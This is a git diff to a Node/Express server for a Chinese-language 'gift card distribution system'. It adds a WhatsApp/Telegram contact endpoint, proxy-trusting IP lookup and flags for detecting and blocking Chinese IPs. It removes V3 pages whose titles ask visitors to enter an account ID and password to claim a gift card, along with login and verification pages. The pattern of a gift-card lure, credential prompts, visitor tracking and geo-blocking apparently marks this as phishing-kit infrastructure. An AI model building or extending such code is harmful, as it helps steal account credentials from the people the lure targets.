@@ -19,6 +19,9 @@ const app = express();
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
 
+// Trust proxy headers (important for container environments)
+app.set('trust proxy', true);
+
 const server = http.createServer(app);
 const io = socketIo(server, {
   cors: {
@@ -51,10 +54,12 @@ i18next
 
 app.use(middleware.handle(i18next));
 
+// Import getRealIP utility
+const getRealIP = require('./utils/get-real-ip');
+
 // Language detection based on IP and system settings
 app.use(async (req, res, next) => {
-  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-  if (ip && ip.startsWith('::ffff:')) ip = ip.substring(7);
+  let ip = getRealIP(req);
   const geo = geoip.lookup(ip);
   let lang = 'en';
   let isChineseIP = false;
@@ -192,6 +197,28 @@ async function startServer() {
     app.use('/api/member', memberRoutes);
     app.use('/api/tracking', trackingRoutes);
     
+    // Contact info API endpoint
+    app.get('/api/contact-info', async (req, res) => {
+      try {
+        const whatsapp = await db.query(
+          'SELECT setting_value FROM system_settings WHERE setting_key = ?',
+          ['whatsapp_link']
+        );
+        const telegram = await db.query(
+          'SELECT setting_value FROM system_settings WHERE setting_key = ?',
+          ['telegram_link']
+        );
+        
+        res.json({
+          whatsapp: whatsapp && whatsapp.length > 0 ? whatsapp[0].setting_value : '',
+          telegram: telegram && telegram.length > 0 ? telegram[0].setting_value : ''
+        });
+      } catch (error) {
+        console.error('Failed to get contact info:', error);
+        res.json({ whatsapp: '', telegram: '' });
+      }
+    });
+
     // Health check route
     app.get('/health', async (req, res) => {
       try {
@@ -225,32 +252,15 @@ async function startServer() {
     });
     
     app.get('/', (req, res) => {
-      res.render('index', { title: '礼品卡发放系统' });
+      res.render('index', { 
+        title: '礼品卡发放系统',
+        version: 'v4',
+        recommendLang: res.locals.recommendLang || 'en',
+        isChineseIP: res.locals.isChineseIP || false,
+        blockChineseIP: res.locals.blockChineseIP || false
+      });
     });
 
-    app.get('/gc', async (req, res) => {
-      try {
-        // 获取WhatsApp和Telegram配置
-        const settings = await db.query('SELECT setting_key, setting_value FROM system_settings WHERE setting_key IN (?, ?)', ['whatsapp_link', 'telegram_link']);
-        
-        let whatsappLink = '';
-        let telegramLink = '';
-        
-        settings.forEach(setting => {
-          if (setting.setting_key === 'whatsapp_link') {
-            whatsappLink = setting.setting_value;
-          } else if (setting.setting_key === 'telegram_link') {
-            telegramLink = setting.setting_value;
-          }
-        });
-        
-        res.render('gc', { whatsappLink, telegramLink, locale: 'zh-CN' });
-      } catch (error) {
-        console.error('获取联系方式配置失败:', error);
-        // 如果获取失败，使用默认空值
-        res.render('gc', { whatsappLink: '', telegramLink: '', locale: 'zh-CN' });
-      }
-    });
 
     app.get('/test-cn', async (req, res) => {
       res.locals.isChineseIP = true;
@@ -272,53 +282,6 @@ async function startServer() {
       res.render('index', { title: '礼品卡发放系统' });
     });
 
-    // V3 页面路由
-    app.get('/v3', (req, res) => {
-      res.render('v3/index', { 
-        title: '礼品卡验证与领取 - 输入账户ID和密码',
-        version: 'v3'
-      });
-    });
-
-    app.get('/v3/login', (req, res) => {
-      res.render('v3/login', { 
-        title: '登录 - 账户ID'
-      });
-    });
-
-    app.get('/v3/verification', (req, res) => {
-      res.render('v3/verification', { 
-        title: '验证 - 账户ID'
-      });
-    });
-
-    app.get('/v3/success', (req, res) => {
-      res.render('v3/success', { 
-        title: '成功 - 礼品卡领取完成'
-      });
-    });
-
-    // V3 Enhanced 页面路由 - 新的SPA版本
-    app.get('/v3-enhanced', (req, res) => {
-      res.render('v3-enhanced/index', { 
-        title: '礼品卡发放系统 - Enhanced',
-        version: 'v3-enhanced'
-      });
-    });
-
-    // V3 Enhanced 简单版本 - 直接复制v3结构
-    app.get('/v3-simple', (req, res) => {
-      res.render('v3-enhanced/simple', { 
-        title: '礼品卡发放系统 - Simple',
-        version: 'v3-simple'
-      });
-    });
-
-    // V3 静态资源路由
-    app.use('/v3', express.static(path.join(__dirname, 'views/v3')));
-    
-    // V3 Enhanced 静态资源路由
-    app.use('/v3-enhanced', express.static(path.join(__dirname, 'public/v3-enhanced')));
 
     
     // Start HTTP server
